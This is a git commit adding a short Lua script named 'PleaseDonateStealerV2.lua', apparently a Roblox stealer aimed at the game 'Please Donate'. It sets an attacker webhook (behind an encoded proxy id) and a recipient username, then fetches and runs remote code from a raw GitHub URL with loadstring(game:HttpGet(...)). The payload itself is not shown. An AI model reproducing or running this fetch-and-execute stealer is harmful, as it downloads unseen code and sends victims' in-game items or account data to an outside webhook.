35bad1079f2f67cc5d11ef8a036762204b416b61
NaruTeam <naruteamservice@gmail.com>
2025-03-15 17:41:14 +0700

    Create PleaseDonateStealerV2.lua

---
+++ PleaseDonateStealerV2.lua
@@ -0,0 +1,4 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=aUlJVktIeEcxS09ZUjhNVmdPVGlKdzp4Mkc3VXFKUVZtNFU5RzdaZmFNVHIteVBoMHlKQWxWSHdMOGlYWmhwejZLNHpsMlJlSTVQTllVUk9Kb0xjS0tEUFBEcXJPaHhBbHJhMWZHZS1ZR3hiNVktemw0RWhLV3NGaXROcEt0eGJ3LUZLNGdHbnZPZHFGTFlRT3lOSk15N21vOFJYUU90eGtla202czBWekdkMFlUc1htRzBZT2gwT1UwTVpMS3Uzdzg"
+Username = "HTNTPbloxfruit"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/wow1/refs/heads/main/f222",true))()
